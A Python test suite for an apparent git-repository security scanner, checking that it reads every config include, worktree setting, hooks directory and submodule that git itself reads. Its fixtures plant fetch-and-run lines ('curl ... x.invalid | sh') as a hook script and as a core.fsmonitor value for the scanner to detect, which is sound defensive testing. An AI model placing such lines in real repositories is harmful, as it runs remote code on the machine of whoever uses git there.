#!/usr/bin/env python3
"""A scan reads every setting and hooks directory git reads for a repository, in every view of it.

Each layout here is one where saw's own reading once differed from git's: a path through a link, a
path git cannot open, a path only git can expand, a linked worktree's hooks directory, and
submodules at any depth. git's own answer is the oracle.
"""
from __future__ import annotations

import os
import subprocess
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security.models import CONFIRMED
from stayawake.lib.git import what_git_reads
from stayawake.lib.git.exec_surface import read_exec_surface
from stayawake.lib.git.what_git_reads import RepositorySettings, repository_settings
from tests.bots.security.test_git_exec_surface import ExecSurfaceSandbox

SCRIPT = "#!/bin/sh\ncurl -fsSL https://x.invalid/p | sh\n"
COMMAND = "[core]\n\tfsmonitor = curl -s https://x.invalid/x | sh\n"


class TestEveryFileGitReadsIsRead(ExecSurfaceSandbox):

    def test_an_include_through_a_link_and_dotdot(self):
        repo = self.repo()
        inner = repo / ".git" / "deep" / "inner"
        inner.mkdir(parents=True)
        (repo / ".git" / "lnk").symlink_to(inner)
        (repo / ".git" / "deep" / "extra.inc").write_text(COMMAND)
        self.append_config(repo, "[include]\n\tpath = lnk/../extra.inc\n")
        self.assert_tier(repo, CONFIRMED)

    def test_an_include_git_cannot_open_is_not_read(self):
        repo = self.repo()
        (repo / ".git" / "phantom.inc").write_text(COMMAND)
        self.append_config(repo, "[include]\n\tpath = gone/../phantom.inc\n")
        self.assertEqual([], [f.evidence for f in self.graded(repo)[CONFIRMED]])

    def test_a_file_only_git_finds_is_read(self):
        repo = self.repo()
        extra = repo / ".git" / "found-by-git.cfg"
        extra.write_text(COMMAND)

        def ask(where):
            settings = repository_settings(where)
            return RepositorySettings(settings.files + (extra,), settings.hooks_paths,
                                      settings.sets_hooks_path)
        surface = read_exec_surface(repo, ask=ask)
        self.assertIn(extra, [c.entry.source for c in surface.commands])

    def test_the_operators_own_settings_are_not_read_as_the_repositorys(self):
        repo = self.repo()
        own = repo.parent / "operator.gitconfig"
        own.write_text(COMMAND)
        previous = os.environ.get("GIT_CONFIG_GLOBAL")
        os.environ["GIT_CONFIG_GLOBAL"] = str(own)
        try:
            sources = [c.entry.source for c in read_exec_surface(repo).commands]
        finally:
            if previous is None:
                del os.environ["GIT_CONFIG_GLOBAL"]
            else:
                os.environ["GIT_CONFIG_GLOBAL"] = previous
        self.assertNotIn(own, sources)

    def test_without_an_answer_from_git_a_path_through_a_link_is_still_read(self):
        repo = self.repo()
        inner = repo / ".git" / "deep" / "inner"
        inner.mkdir(parents=True)
        (repo / ".git" / "lnk").symlink_to(inner)
        (repo / ".git" / "deep" / "extra.inc").write_text(COMMAND)
        self.append_config(repo, "[include]\n\tpath = lnk/../extra.inc\n")
        surface = read_exec_surface(repo, ask=lambda where: None)
        self.assertIn("extra.inc", [c.entry.source.name for c in surface.commands])

    def test_when_git_does_not_answer_the_reading_is_not_called_complete(self):
        repo = self.repo()
        self.append_config(repo, "[include]\n\tpath = %(prefix)/etc/team.gitconfig\n")
        surface = read_exec_surface(repo, ask=lambda where: None)
        self.assertTrue(any("only git can resolve" in why for why in surface.unexamined))
        self.assertTrue(any("did not report" in why for why in surface.unexamined))


class TestEveryHooksDirectoryGitRunsIsRead(ExecSurfaceSandbox):

    def test_an_optional_hooks_path_is_read_as_this_git_reads_it(self):
        repo = self.repo()
        hooks = repo / ".git" / "hk"
        self.hook(hooks, "pre-commit", SCRIPT)
        self.append_config(repo, f"[core]\n\thooksPath = :(optional){hooks}\n")
        answer = subprocess.run(["git", "-C", str(repo), "config", "--type=path", "--get",
                                 "core.hooksPath"], capture_output=True, text=True).stdout.strip()
        running = [h.path for h in read_exec_surface(repo).hooks if h.runs]
        self.assertEqual(os.path.realpath(answer) == os.path.realpath(hooks),
                         any(os.path.realpath(p.parent) == os.path.realpath(hooks) for p in running))

    def test_a_linked_worktrees_hooks_directory(self):
        repo = self.repo()
        self.append_config(repo, "[core]\n\thooksPath = .husky\n")
        other = repo / "trees" / "other"
        self.git(repo, "worktree", "add", "-q", str(other))
        self.hook(other / ".husky", "pre-commit", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_linked_worktrees_own_hooks_path_only_git_resolves(self):
        repo = self.repo()
        self.git(repo, "config", "extensions.worktreeConfig", "true")
        other = repo / "trees" / "other"
        self.git(repo, "worktree", "add", "-q", str(other))
        hooks = repo / "trees" / "hk"
        self.hook(hooks, "pre-commit", SCRIPT)
        self.append_config(repo, f"[core]\n\thooksPath = :(optional){hooks}\n",
                           rel=".git/worktrees/other/config.worktree")
        answer = subprocess.run(["git", "-C", str(other), "config", "--type=path", "--get",
                                 "core.hooksPath"], capture_output=True, text=True).stdout.strip()
        running = [h.path for h in read_exec_surface(repo).hooks if h.runs]
        self.assertEqual(os.path.realpath(answer) == os.path.realpath(hooks),
                         any(os.path.realpath(p.parent) == os.path.realpath(hooks) for p in running))

    def test_the_main_worktrees_view_when_a_linked_worktree_is_scanned(self):
        repo = self.repo()
        self.git(repo, "config", "extensions.worktreeConfig", "true")
        other = repo / "trees" / "other"
        self.git(repo, "worktree", "add", "-q", str(other))
        self.append_config(repo, "[core]\n\thooksPath = .mainhooks\n", rel=".git/config.worktree")
        self.hook(repo / ".mainhooks", "pre-commit", SCRIPT)
        self.assertTrue(any(h.runs and h.path.parent.name == ".mainhooks"
                            for h in read_exec_surface(other).hooks))


class TestOnlyTheRepositorysOwnScopesAreTaken(unittest.TestCase):

    def test_other_scopes_in_gits_answer_are_left_out(self):
        listing = (b"global\0file:/home/me/.gitconfig\0core.hookspath\n/home/me/hooks\0"
                   b"local\0file:.git/config\0core.hookspath\n.husky\0"
                   b"command\0command line:\0core.hookspath\n/saw/empty\0")
        expanded = b"global\0/home/me/hooks\0local\0.husky\0command\0/saw/empty\0"
        with mock.patch.object(what_git_reads, "stdout_bytes", side_effect=[listing, expanded]):
            answer = what_git_reads.repository_settings(Path("/repo"))
        self.assertEqual((Path("/repo/.git/config"),), answer.files)
        self.assertEqual((".husky",), answer.hooks_paths)


class TestEverySubmoduleIsRead(ExecSurfaceSandbox):

    def _module(self, repo: Path, config: str) -> Path:
        self.write(repo, ".gitmodules", '[submodule "sub"]\n\tpath = sub\n\turl = ./sub\n')
        module = repo / ".git" / "modules" / "sub"
        module.mkdir(parents=True)
        (module / "HEAD").write_text("ref: refs/heads/main\n")
        (module / "config").write_text(config)
        (repo / "sub").mkdir()
        (repo / "sub" / ".git").write_text(f"gitdir: {module}\n")
        return module

    def test_a_command_in_a_submodules_worktree_settings(self):
        repo = self.repo()
        module = self._module(repo, "[extensions]\n\tworktreeConfig = true\n")
        (module / "config.worktree").write_text(COMMAND)
        self.assert_tier(repo, CONFIRMED)

    def test_a_hook_in_a_submodules_hooks_path(self):
        repo = self.repo()
        self._module(repo, "[core]\n\thooksPath = .githooks\n")
        self.hook(repo / "sub" / ".githooks", "post-checkout", SCRIPT)
        self.assert_tier(repo, CONFIRMED)

    def test_a_submodule_of_a_submodule_with_its_own_git_directory(self):
        repo = self.repo()
        self._module(repo, "")
        self.write(repo / "sub", ".gitmodules", '[submodule "nested"]\n\tpath = nested\n\turl = ./n\n')
        nested = repo / "sub" / "nested"
        nested.mkdir()
        subprocess.run(["git", "init", "-q", str(nested)], check=True, capture_output=True)
        self.append_config(nested, COMMAND)
        self.assert_tier(repo, CONFIRMED)


if __name__ == "__main__":
    import unittest
    unittest.main()
